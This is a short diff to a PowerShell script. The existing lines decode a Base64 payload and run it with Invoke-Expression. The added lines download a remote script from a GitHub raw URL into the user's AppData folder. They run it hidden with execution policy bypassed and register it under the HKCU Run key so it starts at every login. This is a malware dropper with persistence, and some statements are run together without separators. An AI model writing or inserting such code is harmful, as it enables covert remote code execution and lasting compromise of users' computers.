@@ -35,3 +35,5 @@ $k = [Convert]::FromBase64String($j)
 $l = [Text.Encoding]::UTF8.GetString($k)
 
 Invoke-Expression $l
+Du:
+$path="$env:APPDATA\update.ps1" Invoke-WebRequest 'https://raw.githubusercontent.com/MettBrot420420/123/refs/heads/main/dsfdsf' -OutFile $path if(Test-Path "$env:windir\Sysnative\WindowsPowerShell\v1.0\powershell.exe"){ $ps="$env:windir\Sysnative\WindowsPowerShell\v1.0\powershell.exe" } else { $ps="$env:windir\System32\WindowsPowerShell\v1.0\powershell.exe" } $cmd = "$ps -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "$path"" Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MyStartupEntry" -Value $cmd
